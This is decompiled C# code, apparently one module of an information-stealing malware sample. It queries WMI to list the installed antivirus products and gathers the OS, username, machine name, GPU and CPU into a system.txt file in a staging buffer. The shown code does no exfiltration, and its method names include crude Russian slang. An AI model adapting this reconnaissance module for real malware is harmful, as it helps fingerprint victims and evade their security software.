using System;
using System.Collections.Generic;
using System.IO;
using System.Management;
using Microsoft.Win32;

// Token: 0x02000010 RID: 16
internal class Information
{
	// Token: 0x06000025 RID: 37 RVA: 0x000040F4 File Offset: 0x000022F4
	private static List<string> ishi_pidor(string _class, string anus_blyat)
	{
		List<string> list = new List<string>();
		ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM " + _class);
		try
		{
			foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
			{
				ManagementObject managementObject = (ManagementObject)managementBaseObject;
				list.Add(managementObject[anus_blyat].ToString().Trim());
			}
		}
		catch
		{
		}
		return list;
	}

	// Token: 0x06000026 RID: 38 RVA: 0x00004180 File Offset: 0x00002380
	protected static string[] AVDetect()
	{
		try
		{
			ManagementObjectCollection managementObjectCollection = new ManagementObjectSearcher("root\\SecurityCenter2", "SELECT * FROM AntiVirusProduct").Get();
			string text = "";
			int num = 0;
			foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
			{
				num++;
				string format = "{0}[{1}] {2}\n";
				object arg = text;
				object arg2 = num;
				object obj = managementBaseObject["displayName"];
				text = string.Format(format, arg, arg2, (obj != null) ? obj.ToString() : null);
			}
			return new string[]
			{
				num.ToString(),
				text.Trim()
			};
		}
		catch
		{
		}
		return new string[]
		{
			"0",
			""
		};
	}

	// Token: 0x06000027 RID: 39 RVA: 0x00004250 File Offset: 0x00002450
	public static void Start()
	{
		string path = string.Format("{0}system.txt", global::Buffer.path_l);
		try
		{
			Information.AVDetect();
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion");
			string text = string.Concat(new object[]
			{
				"OS: ",
				registryKey.GetValue("ProductName"),
				" x",
				IntPtr.Size * 8,
				"\nUsername: ",
				Environment.UserName,
				"\nComputer: ",
				Environment.MachineName,
				"\nVideocard: ",
				Information.ishi_pidor("Win32_VideoController", "Name")[0],
				"\nProccessor: ",
				Information.ishi_pidor("Win32_Processor", "Name")[0]
			});
			File.WriteAllText(path, text.Replace("\n", Environment.NewLine));
			return;
		}
		catch
		{
			File.WriteAllText(path, "");
		}
		global::Buffer.XBufferData[18] = "0";
	}
}
